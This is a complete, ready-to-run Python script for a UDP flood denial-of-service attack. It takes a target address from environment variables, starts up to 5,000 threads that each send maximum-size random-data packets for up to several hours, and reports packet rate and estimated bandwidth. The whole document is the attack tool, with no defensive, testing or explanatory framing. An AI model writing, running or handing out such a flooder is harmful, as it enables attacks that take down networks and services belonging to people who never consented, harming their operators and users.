#!/usr/bin/env python3
import os
import socket
import threading
import time
import sys

TARGET_IP    = os.getenv("TARGET_IP", "").strip()
TARGET_PORT  = int(os.getenv("TARGET_PORT", "80").strip())
THREADS      = min(int(os.getenv("THREADS", "1000").strip()), 5000)
DURATION     = min(int(os.getenv("DURATION", "300").strip()), 21000)

if not TARGET_IP:
    print("❌ ERROR: TARGET_IP not set", file=sys.stderr)
    sys.exit(1)

print(f"🚀 UDP Flood starting")
print(f"🎯 Target: {TARGET_IP}:{TARGET_PORT}")
print(f"🧵 Threads: {THREADS}")
print(f"⏰ Duration: {DURATION}s")
print(f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")

running     = True
sent_count  = 0
bytes_sent  = 0
lock        = threading.Lock()

def flood():
    global sent_count, bytes_sent
    while running:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            payload = os.urandom(65507)
            s.sendto(payload, (TARGET_IP, TARGET_PORT))
            s.close()
            with lock:
                sent_count += 1
                bytes_sent += len(payload)
        except Exception:
            pass

# Start threads
threads = []
for i in range(THREADS):
    t = threading.Thread(target=flood, daemon=True)
    t.start()
    threads.append(t)

print(f"✅ {THREADS} threads launched!")
print(f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")

start = time.time()
last_count = 0

try:
    while time.time() - start < DURATION:
        time.sleep(5)
        elapsed  = int(time.time() - start)
        remaining = DURATION - elapsed

        with lock:
            pkts  = sent_count
            mbsent = bytes_sent / (1024 * 1024)
            speed = (pkts - last_count) / 5  # packets per second
            last_count = pkts

        gbps = (speed * 65507 * 8) / 1_000_000_000

        print(
            f"[{elapsed:5}s/{DURATION}s] "
            f"Packets: {pkts:,} | "
            f"Speed: {speed:.0f} pkt/s | "
            f"Data: {mbsent:.1f} MB | "
            f"~{gbps:.3f} Gbps | "
            f"Remaining: {remaining}s",
            flush=True
        )
except KeyboardInterrupt:
    print("⏹️ Interrupted")
finally:
    running = False

time.sleep(1)
with lock:
    final_mb = bytes_sent / (1024 * 1024)
    final_gb = bytes_sent / (1024 * 1024 * 1024)

print(f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
print(f"✅ DONE!")
print(f"📊 Total Packets : {sent_count:,}")
print(f"📦 Total Data    : {final_mb:.2f} MB ({final_gb:.3f} GB)")
print(f"⏰ Duration      : {int(time.time()-start)}s")
